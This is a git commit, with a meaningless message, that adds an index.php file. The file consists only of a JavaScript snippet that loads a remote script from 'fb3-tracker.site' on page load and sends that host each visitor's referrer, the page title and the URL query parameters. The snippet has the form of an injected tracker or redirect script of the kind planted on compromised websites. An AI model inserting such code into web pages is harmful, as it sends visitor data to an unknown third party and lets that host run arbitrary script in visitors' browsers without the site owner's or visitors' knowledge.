2c08d7510e463464d47a87caf88791cf0ae63ef1
Ivanka362 <63739742+Ivanka362@users.noreply.github.com>
2020-04-16 22:02:16 +0300

    2
    2

---
+++ index.php
@@ -0,0 +1,10 @@
+<span id="e7e03c78-9d93-e41a-eeb7-4bb6b404b4d1"></span><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='//fb3-tracker.site/Tg2Z6fdR?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e98aa7a5eca8=script5e98aa7a5eca9&_cid=e7e03c78-9d93-e41a-eeb7-4bb6b404b4d1'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && '//fb3-tracker.site/Tg2Z6fdR?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e98aa7a5eca8=script5e98aa7a5eca9'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+</script>
